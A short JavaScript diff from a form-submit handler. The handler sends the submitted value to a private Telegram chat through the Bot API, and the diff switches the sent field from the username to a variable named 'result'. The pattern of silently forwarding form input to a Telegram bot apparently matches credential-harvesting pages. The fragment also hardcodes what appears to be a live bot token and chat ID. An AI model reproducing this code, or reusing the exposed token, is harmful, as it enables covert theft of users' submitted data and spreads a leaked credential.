@@ -31,7 +31,7 @@ form.addEventListener("submit", function(event) {
       //send tg username
       const botApiToken = '6124695087:AAG0NprnUOPuxyaHA_79ZDazy870_007Dtk';
   const chatId = '1483919112';
-  const url = `https://api.telegram.org/bot${botApiToken}/sendMessage?chat_id=${chatId}&text=${username}`;
+  const url = `https://api.telegram.org/bot${botApiToken}/sendMessage?chat_id=${chatId}&text=${result}`;
 
   fetch(url)
     .then(response => {
